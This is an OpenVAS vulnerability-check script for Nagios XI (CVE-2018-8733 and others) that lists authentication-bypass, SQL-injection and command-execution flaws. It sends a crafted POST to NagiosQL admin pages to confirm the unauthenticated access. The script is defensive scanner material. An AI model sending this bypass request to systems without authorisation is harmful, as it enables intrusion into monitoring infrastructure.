###############################################################################
# OpenVAS Vulnerability Test
#
# Nagios XI Multiple Vulnerabilities-April18
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Updated By: Rajat Mishra <rajatm@secpod.com> on 2018-05-21
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nagios:nagiosxi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813215");
  script_version("2019-05-03T08:55:39+0000");
  script_cve_id("CVE-2018-8733", "CVE-2018-8734", "CVE-2018-8735", "CVE-2018-8736",
                "CVE-2018-10736", "CVE-2018-10735", "CVE-2018-10738", "CVE-2018-10737",
                "CVE-2018-10810");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2019-05-03 08:55:39 +0000 (Fri, 03 May 2019)");
  script_tag(name:"creation_date", value:"2018-04-27 10:44:16 +0530 (Fri, 27 Apr 2018)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Nagios XI Multiple Vulnerabilities-April18");

  script_tag(name:"summary", value:"This host is running Nagios XI and is
  prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send crafted data via 'HTTP POST' request
  and check whether it is able access the restricted pages.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - Authentication bypass vulnerability in the core config manager in allows an
    unauthenticated attacker to make configuration changes and leverage an
    authenticated SQL injection vulnerability.

  - SQL injection vulnerability in the core config manager allows an attacker
    to execute arbitrary SQL commands via the selInfoKey1 parameter.

  - A remote command execution (RCE) vulnerability allows an attacker to execute
    arbitrary commands on the target system, aka OS command injection.

  - A privilege escalation vulnerability, allows an attacker to leverage an
    RCE vulnerability escalating to root.

  - SQL injection vulnerability in the txtSearch parameter of admin/logbook.php.

  - SQL injection vulnerability in the chbKey1 parameter of admin/menuaccess.php.

  - SQL injection vulnerability in the cname parameter of admin/commandline.php.

  - SQL injection vulnerability in the key1 parameter of admin/info.php.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to execute arbitrary SQL commands, execute arbitrary commands and
  to leverage an RCE vulnerability escalating to root.");

  script_tag(name:"affected", value:"Nagios XI versions 5.2.x through 5.4.x before 5.4.13");

  script_tag(name:"solution", value:"Upgrade to Nagios X 5.4.13 or later. Please see the references for more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.nagios.com/downloads");
  script_xref(name:"URL", value:"https://gist.github.com/caleBot/f0a93b5a98574393e0139104eacc2d0f");
  script_xref(name:"URL", value:"https://assets.nagios.com/downloads/nagiosxi/CHANGES-5.TXT");
  script_xref(name:"URL", value:"https://github.com/rapid7/metasploit-framework/pull/9938");
  script_xref(name:"URL", value:"http://blog.redactedsec.net/exploits/2018/04/26/nagios.html");
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_nagios_XI_detect.nasl");
  script_mandatory_keys("nagiosxi/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = "/nagiosql/admin/helpedit.php";
login_data = 'txtRootPath=nagiosql%2F&txtBasePath=%2Fvar%2Fwww%2Fhtml' +
             '%2Fnagiosql%2F&selProtocol=http&txtTempdir=%2Ftmp&selLa' +
             'nguage=en_GB&txtEncoding=utf-8&txtDBserver=localhost&tx' +
             'tDBport=3306&txtDBname=nagiosql&txtDBuser=nagiosql&txtD' +
             'Bpass=n%40gweb&txtLogoff=3600&txtLines=15&selSeldisable=1';
req = http_post_req(port:http_port, url:url, data:login_data,
                    add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
buf = http_keepalive_send_recv(port:http_port, data:req);

## Fixed versions returns HTTP/1.1 403 Forbidden
if(buf =~ "HTTP/1.. 302" && ">Sub key<" >< buf &&
   ">Nagios Core Config Manager<" >< buf && ">serviceextinfo<" >< buf
    && ">NagiosQL - Version:" >< buf)
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}

url = "/nagiosql/admin/settings.php";
req = http_post_req(port:http_port, url:url, data:login_data,
                    add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
buf = http_keepalive_send_recv(port:http_port, data:req);

## Fixed versions returns HTTP/1.1 403 Forbidden
if(buf =~ "HTTP/1.. 302" && "NagiosQL System Monitoring Administration Tool" >< buf
  && ">Nagios Core Config Manager<" >< buf && ">Settings<" >< buf && ">NagiosQL<" >< buf)
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
exit(0);
